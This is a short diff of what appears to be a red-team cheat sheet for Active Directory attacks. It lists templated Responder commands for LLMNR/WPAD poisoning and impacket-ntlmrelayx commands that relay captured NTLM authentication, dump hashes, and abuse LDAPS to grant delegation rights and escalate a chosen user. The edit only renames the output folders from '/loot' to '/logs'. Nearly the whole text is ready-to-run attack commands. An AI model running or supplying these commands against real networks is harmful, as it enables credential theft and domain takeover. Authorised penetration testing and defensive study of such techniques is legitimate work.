@@ -17,7 +17,7 @@ responder -I {{IFACE}} -wdA
 # WPAD + HTTP/SMB (noisier)
 responder -I {{IFACE}} -wd
 
-impacket-ntlmrelayx -tf /loot/enum/relay.txt -smb2support -socks -of /loot/hashes/relay
+impacket-ntlmrelayx -tf /logs/enum/relay.txt -smb2support -socks -of /logs/hashes/relay
 # LDAP → RBCD / shadow / add-computer
 impacket-ntlmrelayx -t ldaps://{{DC}} -smb2support --delegate-access --escalate-user {{USER}}
 # ESC8
